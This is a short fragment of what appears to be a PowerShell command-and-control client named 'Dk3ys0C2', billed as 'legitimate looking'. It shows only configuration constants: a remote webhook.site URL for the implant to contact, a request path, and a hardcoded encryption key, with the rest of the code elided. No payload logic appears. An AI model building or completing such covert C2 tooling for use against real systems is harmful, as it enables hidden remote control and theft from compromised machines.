#
# Dk3ys0C2 - legitimate looking command and control
#
...
# CONFIG CONSTANTS:
# Site used to communicate with (remote Dk3ys0C2 site)

$SITE_URL = "https://webhook.site/1c6bb4c0-3fbd-4388-b041-9424c58c5930"#"192.168.18.13"#"http://127.0.0.1"
# THIS IS WHAT PATH WE WANT TO HIT FOR CODE - YOU CAN MAKE THIS ANYTHING EXAMPLE: /index.aspx (note you need to change this as well on Dk3ys0c2_server)
$ROOT_PATH_QUERY = "/"
...
$CIPHER = "Dk3ys0c2S3curity007#Y3llowH@kC0mp@ny"
# DO NOT CHANGE BELOW THIS LINE

# Using the same key derivation from Dk3ys0C2 https://gist.github.com/ctigeek/2a56648b923d198a6e60
